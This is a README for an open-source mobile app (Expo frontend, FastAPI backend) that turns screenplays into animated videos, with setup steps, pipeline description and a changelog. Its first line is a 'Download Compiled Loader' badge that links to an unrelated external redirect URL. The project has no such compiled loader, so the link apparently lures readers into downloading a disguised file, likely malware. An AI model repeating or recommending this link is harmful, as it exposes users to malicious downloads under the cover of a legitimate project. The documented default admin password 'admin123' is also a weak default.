# AI Animation Studio

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A mobile app (Expo / React Native) that turns plain-text screenplays into shareable animated videos — fully open-source, no paid APIs required.

---

## Architecture

```
┌─────────────────────────┐        ┌────────────────────────────────┐
│  Expo Mobile Frontend   │  HTTP  │      FastAPI Backend           │
│  (React Native / TS)    │◄──────►│                                │
│                         │        │  Pipeline modules:             │
│  • Auth (JWT)           │        │  1. Parse  — regex screenplay  │
│  • Project Dashboard    │        │  2. Audio  — edge-tts + pydub  │
│  • Live Progress View   │        │  3. Art    — Pollinations.ai   │
│  • Media Converter UI   │        │  4. Video  — moviepy + ffmpeg  │
└─────────────────────────┘        │  5. Convert— ffmpeg/PIL/pydub  │
                                   └───────────────┬────────────────┘
                                                   │
                                             ┌─────▼──────┐
                                             │  MongoDB   │
                                             └────────────┘
```

## Tech Stack (all free / open-source)

| Layer | Library | License |
|---|---|---|
| Frontend | Expo SDK 54, expo-router | MIT |
| Auth token | expo-secure-store | MIT |
| Icons | lucide-react-native | ISC |
| Backend | FastAPI + uvicorn | MIT |
| Database | MongoDB + Motor | Apache-2 |
| Auth | PyJWT + bcrypt | MIT |
| TTS | edge-tts (MS Edge voices, free) | GPL-3 |
| Audio mix | pydub | MIT |
| Image gen | Pollinations.ai (free REST API) | — |
| Image proc | Pillow | HPND |
| Video | moviepy | MIT |
| Video codec | ffmpeg (system binary) | LGPL |
| Captions | ImageMagick (system binary) | Apache |

---

## Quick Start

### Option A — Docker (recommended)

```bash
# 1. Clone / unzip the project
cd ai-animation-studio

# 2. Set your secret
echo "JWT_SECRET=$(python3 -c "import secrets; print(secrets.token_hex(32))")" > .env

# 3. Start everything
docker-compose up --build

# Backend is now at http://localhost:8000
# MongoDB is at localhost:27017
```

### Option B — Local / Manual

**Prerequisites:** Python 3.11+, Node 18+, MongoDB, ffmpeg, ImageMagick

```bash
# ── Backend ────────────────────────────────────────
cd backend
cp .env.example .env          # fill in JWT_SECRET + DB details
pip install -r requirements.txt
uvicorn server:app --reload --port 8000

# ── Frontend ───────────────────────────────────────
cd frontend
cp .env.example .env          # set EXPO_PUBLIC_BACKEND_URL
yarn install
yarn start                    # scan QR with Expo Go app
```

---

## How the Pipeline Works

1. **Parse** — Regex-based screenplay parser. Detects `INT./EXT.` headings, `CHARACTER` cues, parentheticals, action lines. Estimates scene durations and detects mood from keywords.

2. **Audio** — Each character is deterministically assigned an MS Edge TTS voice (no API key). Dialogue is synthesised line-by-line, normalised to -6 dBFS, and concatenated into a per-scene WAV track.

3. **Art** — Sends mood/location prompts to Pollinations.ai (free Stable Diffusion endpoint). If the service is unavailable, a stylised gradient with the scene label is generated locally by PIL.

4. **Video** — moviepy composites background (Ken-Burns pan/zoom), character sprites (bob animation during speech), burnt-in captions (ImageMagick), and scene fades. Produces 16:9 MP4 + 9:16 vertical crop (TikTok/Reels).

5. **Convert** — ffmpeg/PIL/pydub toolbox for format conversion, trim, resize preset, speed ramp, and watermark.

---

## Script Format

The parser understands standard screenplay conventions:

```
INT. COFFEE SHOP - DAY

Action lines describe what the camera sees.

MAYA
Dialogue goes here. The character name must be ALL CAPS.

JESSE
(quietly)
Parentheticals are optional but supported.

EXT. CITY STREET - NIGHT

Another scene.
```

Runtime is capped at 5 minutes per project.

---

## Environment Variables

### Backend (`backend/.env`)

| Variable | Description | Default |
|---|---|---|
| `MONGO_URL` | MongoDB connection string | `mongodb://localhost:27017` |
| `DB_NAME` | Database name | `animation_studio` |
| `JWT_SECRET` | Secret for signing JWTs | **required** |
| `WORKSPACE_DIR` | Where project files are stored | `/app/workspace` |
| `ADMIN_EMAIL` | Seeded admin email | `admin@example.com` |
| `ADMIN_PASSWORD` | Seeded admin password | `admin123` |

### Frontend (`frontend/.env`)

| Variable | Description | Example |
|---|---|---|
| `EXPO_PUBLIC_BACKEND_URL` | Backend base URL | `http://192.168.1.10:8000` |

> **Tip:** When running Expo Go on a physical device, use your machine's LAN IP (`ifconfig`/`ipconfig`), not `localhost`.

---

## Project Structure

```
.
├── backend/
│   ├── server.py               # FastAPI app, auth, project CRUD, file serving
│   ├── pipeline/
│   │   ├── parser.py           # Module 1: screenplay → structured data
│   │   ├── audio.py            # Module 2: edge-tts + pydub mixing
│   │   ├── art.py              # Module 3: Pollinations.ai + PIL fallback
│   │   ├── video.py            # Module 4: moviepy composition
│   │   ├── converter.py        # Module 5: ffmpeg/PIL/pydub toolbox
│   │   └── runner.py           # Orchestrator: runs modules, writes progress to DB
│   ├── requirements.txt
│   ├── Dockerfile
│   └── .env.example
├── frontend/
│   ├── app/
│   │   ├── _layout.tsx         # Root layout + AuthProvider
│   │   ├── index.tsx           # Splash / redirect
│   │   ├── (auth)/
│   │   │   ├── login.tsx
│   │   │   └── signup.tsx
│   │   ├── (tabs)/
│   │   │   ├── index.tsx       # Project dashboard
│   │   │   ├── converter.tsx   # Media converter UI
│   │   │   └── profile.tsx
│   │   ├── new-project.tsx     # 3-step wizard
│   │   └── project/[id].tsx    # Live pipeline view + 
│   ├── src/
│   │   ├── api/client.ts       # fetch wrapper + token storage
│   │   ├── context/AuthContext.tsx
│   │   └── theme.ts            # colours, spacing, typography
│   ├── package.json
│   └── .env.example
└── docker-compose.yml
```

---

## Changes Made (from Emergent AI generated version)

| Area | Issue | Fix |
|---|---|---|
| `backend/requirements.txt` | `emergentintegrations` (proprietary Emergent AI package) included | Removed; trimmed to only packages actually used |
| `backend/requirements.txt` | 50+ unused packages (stripe, openai, google-genai, litellm, boto3, spacy stack…) | Removed all |
| `backend/server.py` | Deprecated `@app.on_event("startup/shutdown")` | Replaced with FastAPI `lifespan` context manager |
| `backend/server.py` | Unused `StaticFiles` import | Removed |
| `backend/pipeline/converter.py` | GIF conversion bug: `-vf` flag set twice | Fixed with single unified vf chain |
| `backend/pipeline/converter.py` | `afilters` list referenced before assignment in GIF path | Fixed |
| `backend/pipeline/video.py` | `asyncio.get_event_loop().create_task()` called inside thread executor (not thread-safe) | Replaced with `asyncio.run_coroutine_threadsafe()` |
| `backend/pipeline/runner.py` | Event loop not passed to `assemble_video` | Pass loop reference explicitly |
| `backend/pipeline/__init__.py` | Missing — `pipeline` not importable as a package | Created |
| `frontend/package.json` | `react-native-worklets 0.5.1` conflicts with `react-native-reanimated 4.x` (worklets now bundled) | Removed |
| `frontend/package.json` | `react-native-dotenv` in runtime deps instead of devDeps | Moved |
| `frontend/app/(tabs)/converter.tsx` | `expo-file-system/legacy` import (SDK 53 compat shim) | Updated to `expo-file-system` |
| `frontend/app/project/[id].tsx` | Same `expo-file-system/legacy` issue | Updated |
| Infrastructure | No Dockerfile, docker-compose, or .env templates | Added all |
